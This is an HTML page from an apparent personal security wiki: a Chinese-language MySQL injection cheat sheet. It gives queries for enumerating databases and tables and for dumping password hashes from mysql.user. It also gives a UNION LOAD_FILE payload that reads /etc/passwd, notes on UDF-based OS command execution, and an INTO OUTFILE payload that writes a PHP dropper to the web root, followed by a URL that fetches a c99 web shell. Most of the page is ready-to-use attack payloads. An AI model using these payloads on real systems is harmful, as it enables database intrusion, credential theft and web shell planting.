<!DOCTYPE HTML>
<html>
    <head>
        <link rel="Stylesheet" type="text/css" href="/static/css/style.css">
        <link rel="Stylesheet" type="text/css" href="/static/css/tango.css">
        <title>Mysql 注入 - Wiki | janes</title>
        <meta name="keywords" content=""/>
        <meta name="description" content=""/>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    </head>

    <body>
        <div id="container">
            
<div id="header">
  <div id="post-nav"><a href="/">Home</a>&nbsp;»&nbsp;<a href="/#WebSecurity">WebSecurity</a>&nbsp;»&nbsp;Mysql 注入</div>
</div>
<div class="clearfix"></div>
<div id="title">Mysql 注入</div>
  <div id="content">
  <div class="hlcode"><pre><span class="n">Select</span> <span class="n">Nth</span> <span class="n">Row</span>  <span class="n">SELECT</span> <span class="n">host</span><span class="p">,</span><span class="n">user</span> <span class="n">FROM</span> <span class="n">user</span> <span class="n">ORDER</span> <span class="n">BY</span> <span class="n">host</span> <span class="n">LIMIT</span> <span class="mi">1</span> <span class="n">OFFSET</span> <span class="mi">0</span><span class="p">;</span> <span class="err">#</span> <span class="n">rows</span> <span class="n">numbered</span> <span class="n">from</span> <span class="mi">0</span>

<span class="n">Select</span> <span class="n">Nth</span> <span class="n">Char</span> <span class="n">SELECT</span> <span class="n">substr</span><span class="p">(</span><span class="err">‘</span><span class="n">abcd</span><span class="err">’</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> <span class="err">#</span> <span class="n">returns</span> <span class="n">c</span>
<span class="n">Bitwise</span> <span class="n">AND</span> <span class="n">SELECT</span> <span class="mi">6</span> <span class="o">&amp;</span> <span class="mi">2</span><span class="p">;</span> <span class="err">#</span> <span class="n">returns</span> <span class="mi">2</span>
<span class="n">SELECT</span> <span class="mi">6</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">;</span> <span class="err">#</span> <span class="n">returns</span> <span class="mi">0</span>
<span class="n">ASCII</span> <span class="n">Value</span> <span class="o">-&gt;</span> <span class="n">Char</span> <span class="n">SELECT</span> <span class="kt">char</span><span class="p">(</span><span class="mi">65</span><span class="p">);</span> <span class="err">#</span> <span class="n">returns</span> <span class="n">A</span>
<span class="n">Char</span> <span class="o">-&gt;</span> <span class="n">ASCII</span> <span class="n">Value</span> <span class="n">SELECT</span> <span class="n">ascii</span><span class="p">(</span><span class="err">‘</span><span class="n">A</span><span class="err">’</span><span class="p">);</span> <span class="err">#</span> <span class="n">returns</span> <span class="mi">65</span>
<span class="n">Casting</span> <span class="n">SELECT</span> <span class="n">cast</span><span class="p">(</span><span class="err">’</span><span class="mi">1</span><span class="err">′</span> <span class="n">AS</span> <span class="kt">unsigned</span> <span class="n">integer</span><span class="p">);</span>
<span class="n">SELECT</span> <span class="nf">cast</span><span class="p">(</span><span class="err">’</span><span class="mi">123</span><span class="err">′</span> <span class="n">AS</span> <span class="kt">char</span><span class="p">);</span>

<span class="n">String</span> <span class="n">Concatenation</span>    <span class="n">SELECT</span> <span class="nf">CONCAT</span><span class="p">(</span><span class="err">‘</span><span class="n">A</span><span class="err">’</span><span class="p">,</span><span class="err">&#39;</span><span class="n">B</span><span class="err">’</span><span class="p">);</span> <span class="err">#</span><span class="n">returns</span> <span class="n">AB</span>
<span class="n">SELECT</span> <span class="n">CONCAT</span><span class="p">(</span><span class="err">‘</span><span class="n">A</span><span class="err">’</span><span class="p">,</span><span class="err">&#39;</span><span class="n">B</span><span class="err">’</span><span class="p">,</span><span class="err">&#39;</span><span class="n">C</span><span class="err">’</span><span class="p">);</span> <span class="err">#</span> <span class="n">returns</span> <span class="n">ABC</span>
<span class="n">If</span> <span class="n">Statement</span>    <span class="n">SELECT</span> <span class="k">if</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="err">’</span><span class="n">foo</span><span class="err">’</span><span class="p">,</span><span class="err">&#39;</span><span class="n">bar</span><span class="err">’</span><span class="p">);</span> <span class="err">—</span> <span class="n">returns</span> <span class="err">‘</span><span class="n">foo</span><span class="err">’</span>
<span class="n">Case</span> <span class="n">Statement</span>  <span class="n">SELECT</span> <span class="n">CASE</span> <span class="n">WHEN</span> <span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span> <span class="n">THEN</span> <span class="err">‘</span><span class="n">A</span><span class="err">’</span> <span class="n">ELSE</span> <span class="err">‘</span><span class="n">B</span><span class="err">’</span> <span class="n">END</span><span class="p">;</span> <span class="err">#</span> <span class="n">returns</span> <span class="n">A</span>
<span class="n">Avoiding</span> <span class="n">Quotes</span> <span class="n">SELECT</span> <span class="mi">0</span><span class="err">×</span><span class="mi">414243</span><span class="p">;</span> <span class="err">#</span> <span class="n">returns</span> <span class="n">ABC</span>
<span class="n">Time</span> <span class="n">Delay</span>  <span class="n">SELECT</span> <span class="n">BENCHMARK</span><span class="p">(</span><span class="mi">1000000</span><span class="p">,</span><span class="n">MD5</span><span class="p">(</span><span class="err">‘</span><span class="n">A</span><span class="err">’</span><span class="p">));</span>
<span class="n">SELECT</span> <span class="nf">SLEEP</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span> <span class="err">#</span> <span class="o">&gt;=</span> <span class="mf">5.0.12</span>
<span class="n">Make</span> <span class="n">DNS</span> <span class="n">Requests</span>   <span class="n">Impossible</span><span class="o">?</span>
<span class="n">Command</span> <span class="n">Execution</span>   <span class="n">If</span> <span class="n">mysqld</span> <span class="p">(</span><span class="o">&lt;</span><span class="mf">5.0</span><span class="p">)</span> <span class="n">is</span> <span class="n">running</span> <span class="n">as</span> <span class="n">root</span> <span class="n">AND</span> <span class="n">you</span> <span class="n">compromise</span> <span class="n">a</span> <span class="n">DBA</span> <span class="n">account</span> <span class="n">you</span> <span class="n">can</span> <span class="n">execute</span> <span class="n">OS</span> <span class="n">commands</span> <span class="n">by</span> <span class="n">uploading</span> <span class="n">a</span> <span class="n">shared</span> <span class="n">object</span> <span class="n">file</span> <span class="n">into</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span> <span class="p">(</span><span class="n">or</span> <span class="n">similar</span><span class="p">).</span>  <span class="n">The</span> <span class="p">.</span><span class="n">so</span> <span class="n">file</span> <span class="n">should</span> <span class="n">contain</span> <span class="n">a</span> <span class="n">User</span> <span class="n">Defined</span> <span class="n">Function</span> <span class="p">(</span><span class="n">UDF</span><span class="p">).</span>  <span class="n">raptor_udf</span><span class="p">.</span><span class="n">c</span> <span class="n">explains</span> <span class="n">exactly</span> <span class="n">how</span> <span class="n">you</span> <span class="n">go</span> <span class="n">about</span> <span class="n">this</span><span class="p">.</span>  <span class="n">Remember</span> <span class="n">to</span> <span class="n">compile</span> <span class="k">for</span> <span class="n">the</span> <span class="n">target</span> <span class="n">architecture</span> <span class="n">which</span> <span class="n">may</span> <span class="n">or</span> <span class="n">may</span> <span class="n">not</span> <span class="n">be</span> <span class="n">the</span> <span class="n">same</span> <span class="n">as</span> <span class="n">your</span> <span class="n">attack</span> <span class="n">platform</span><span class="p">.</span>
</pre></div>


<h2 id="_1">信息收集</h2>
<div class="hlcode"><pre><span class="n">system_user</span><span class="p">()</span>     <span class="err">系统用户名</span>
<span class="n">user</span><span class="p">()</span>            <span class="n">MYSQL</span><span class="err">用户名</span> 
<span class="n">current_user</span><span class="p">()</span>    <span class="err">当前用户名</span>
<span class="n">session_user</span><span class="p">()</span>    <span class="err">连接数据库的用户名</span>
<span class="n">database</span><span class="p">()</span>        <span class="err">当前数据库名</span>
<span class="n">schema</span><span class="p">()</span>          <span class="err">当前数据库名</span>
<span class="n">version</span><span class="p">()</span>         <span class="err">当前数据库版本信息</span>
<span class="err">@@</span><span class="n">version</span>
<span class="n">load_file</span><span class="p">()</span>       <span class="n">MYSQL</span><span class="err">读取本地文件</span>

<span class="err">@@</span><span class="n">datadir</span>         <span class="n">Location</span> <span class="n">of</span> <span class="n">DB</span> <span class="n">files</span>
<span class="err">@@</span><span class="n">hostname</span>        <span class="err">服务器主机名</span>
</pre></div>


<div class="hlcode"><pre><span class="n">List</span> <span class="n">Users</span>              <span class="n">SELECT</span> <span class="n">user</span> <span class="n">FROM</span> <span class="n">mysql</span><span class="p">.</span><span class="n">user</span><span class="p">;</span> <span class="err">—</span> <span class="n">priv</span>
<span class="n">List</span> <span class="n">Password</span> <span class="n">Hashes</span>    <span class="n">SELECT</span> <span class="n">host</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">password</span> <span class="n">FROM</span> <span class="n">mysql</span><span class="p">.</span><span class="n">user</span><span class="p">;</span> <span class="err">—</span> <span class="n">priv</span>

<span class="n">SELECT</span> <span class="n">distinct</span><span class="p">(</span><span class="n">db</span><span class="p">)</span> <span class="n">FROM</span> <span class="n">mysql</span><span class="p">.</span><span class="n">db</span> <span class="err">—</span> <span class="n">priv</span>
</pre></div>


<h2 id="information_schema">information_schema</h2>
<blockquote>
<p>MySQL &gt;= v5.0</p>
</blockquote>
<div class="hlcode"><pre><span class="cp"># 查看数据库服务器上的数据库</span>
<span class="n">SELECT</span> <span class="n">SCHEMA_NAME</span> <span class="n">FROM</span> <span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">SCHEMATA</span>

<span class="cp"># 查看某个数据库里面的数据表</span>
<span class="n">SELECT</span> <span class="n">table_name</span> <span class="n">FROM</span> <span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span> <span class="n">WHERE</span> <span class="n">table_schema</span> <span class="o">=</span><span class="err">&#39;数据库名&#39;</span>

<span class="cp"># 查看某个数据表里面的字段</span>
<span class="cp">#   默认当前数据库</span>
<span class="n">SELECT</span> <span class="n">COLUMN_NAME</span> <span class="n">FROM</span> <span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">COLUMNS</span> <span class="n">WHERE</span> <span class="n">table_name</span> <span class="o">=</span><span class="err">&#39;表名&#39;</span>
<span class="cp">#   指定数据库</span>
<span class="n">SELECT</span> <span class="n">COLUMN_NAME</span> <span class="n">FROM</span> <span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">COLUMNS</span> <span class="n">WHERE</span> <span class="n">table_name</span> <span class="o">=</span><span class="err">&#39;表名&#39;</span> <span class="n">AND</span> <span class="n">table_schema</span> <span class="o">=</span><span class="err">&#39;数据库名&#39;</span>

<span class="n">SELECT</span> <span class="n">table_schema</span><span class="p">,</span> <span class="n">table_name</span><span class="p">,</span> <span class="n">column_name</span> <span class="n">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="n">WHERE</span> <span class="n">table_schema</span> <span class="o">!=</span> <span class="err">&#39;</span><span class="n">mysql</span><span class="err">&#39;</span> <span class="n">AND</span> <span class="n">table_schema</span> <span class="o">!=</span> <span class="err">&#39;</span><span class="n">information_schema</span><span class="err">&#39;</span>

<span class="cp"># find table which have a column called ‘username’</span>
<span class="n">SELECT</span> <span class="n">table_schema</span><span class="p">,</span> <span class="n">table_name</span> <span class="n">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="n">WHERE</span> <span class="n">column_name</span> <span class="o">=</span> <span class="err">‘</span><span class="n">username</span><span class="err">’</span>

<span class="cp"># List Privilege</span>
<span class="n">SELECT</span> <span class="n">grantee</span><span class="p">,</span> <span class="n">privilege_type</span><span class="p">,</span> <span class="n">is_grantable</span> <span class="n">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">user_privileges</span><span class="p">;</span>
</pre></div>


<h2 id="_2">注释</h2>
<div class="hlcode"><pre> <span class="o">--</span> <span class="n">comment</span>
<span class="cp">#comment</span>
<span class="cm">/*comment*/</span>
</pre></div>


<h2 id="_3">文件权限</h2>
<p>查询用户读写文件操作权限：</p>
<div class="hlcode"><pre><span class="cp"># 需要root用户来执行   MySQL 4/5</span>
<span class="n">SELECT</span> <span class="n">file_priv</span> <span class="n">FROM</span> <span class="n">mysql</span><span class="p">.</span><span class="n">user</span> <span class="n">WHERE</span> <span class="n">user</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">username</span><span class="err">&#39;</span><span class="p">;</span>

<span class="cp"># 普通用户都可以   MySQL 5</span>
<span class="n">SELECT</span> <span class="n">grantee</span><span class="p">,</span> <span class="n">is_grantable</span> <span class="n">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">user_privileges</span> <span class="n">WHERE</span> <span class="n">privilege_type</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">file</span><span class="err">&#39;</span> <span class="n">AND</span> <span class="n">grantee</span> <span class="n">like</span> <span class="err">&#39;</span><span class="o">%</span><span class="n">username</span><span class="o">%</span><span class="err">&#39;</span><span class="p">;</span>   
</pre></div>


<h2 id="load_file">load_file()</h2>
<p>用户有文件操作权限则可以读取文件</p>
<div class="hlcode"><pre><span class="err">…&#39;</span> <span class="n">UNION</span> <span class="n">ALL</span> <span class="n">SELECT</span> <span class="n">LOAD_FILE</span><span class="p">(</span><span class="err">&#39;</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="err">&#39;</span><span class="p">)</span>    <span class="err">—</span> <span class="n">priv</span><span class="p">,</span> <span class="n">can</span> <span class="n">only</span> <span class="n">read</span> <span class="n">world</span><span class="o">-</span><span class="n">readable</span> <span class="n">files</span><span class="p">.</span>


<span class="n">SELECT</span> <span class="n">LOAD_FILE</span><span class="p">(</span><span class="mh">0x2F6574632F706173737764</span><span class="p">);</span>
</pre></div>


<p>要求：</p>
<div class="hlcode"><pre><span class="err">文件必须在服务器上。</span>
<span class="n">LOAD_FILE</span><span class="p">()</span><span class="err">函数操作文件的当前目录是@@</span><span class="n">datadir</span> <span class="err">。</span>
<span class="n">MySQL</span><span class="err">用户必须拥有对此文件读取的权限。</span>
<span class="err">文件大小必须小于</span> <span class="n">max_allowed_packet</span><span class="err">。</span>
<span class="err">@@</span><span class="n">max_allowed_packet</span><span class="err">的默认大小是</span><span class="mi">1047552</span> <span class="err">字节</span>
<span class="err">文件不存在或不可读，返回</span><span class="nb">NULL</span>
</pre></div>


<h2 id="_4">写文件</h2>
<p>如果用户有文件操作权限可以写文件</p>
<div class="hlcode"><pre><span class="n">INTO</span> <span class="n">OUTFILE</span><span class="o">/</span><span class="n">DUMPFILE</span>

<span class="n">SELECT</span> <span class="o">*</span> <span class="n">FROM</span> <span class="n">mytable</span> <span class="n">INTO</span> <span class="n">dumpfile</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">somefile</span><span class="err">&#39;</span><span class="p">;</span> <span class="err">—</span> <span class="n">priv</span><span class="p">,</span> <span class="n">write</span> <span class="n">to</span> <span class="n">file</span> <span class="n">system</span>
</pre></div>


<div class="hlcode"><pre><span class="nx">SELECT</span> <span class="err">&#39;</span><span class="cp">&lt;?</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">f</span><span class="p">],</span> <span class="nx">\</span><span class="s1">&#39;w\&#39;), file_get_contents($_GET[u])); ?&gt;&#39;</span> <span class="nx">INTO</span> <span class="nx">OUTFILE</span> <span class="s1">&#39;/var/www/get.php&#39;</span>

<span class="nx">http</span><span class="o">://</span><span class="nx">localhost</span><span class="o">/</span><span class="nx">get</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">f</span><span class="o">=</span><span class="nx">shell</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">u</span><span class="o">=</span><span class="nx">http</span><span class="o">://</span><span class="nx">localhost</span><span class="o">/</span><span class="nx">c99</span><span class="o">.</span><span class="nx">txt</span>
</pre></div>


<p>注：</p>
<div class="hlcode"><pre><span class="n">INTO</span> <span class="n">OUTFILE</span> <span class="err">不可以覆盖已存在的文件。</span>
<span class="n">INTO</span> <span class="n">OUTFILE</span> <span class="err">必须是最后一个查询。</span>
<span class="err">引号是必须的，因为没有办法可以编码路径名</span>
</pre></div>


<p>参考：</p>
<p><a href="http://drops.wooyun.org/tips/123">乌云 MySql注入科普</a></p>
<p><a href="http://www.openwall.com/john/">crack mysql password</a></p>
</div>

        </div>
        <div id="footer">
            <span>
                Copyright © 2012-2016 .
                Powered by <a href="http://simiki.org/" target="_blank">Simiki</a>.
            </span>
        </div>
        
    </body>
</html>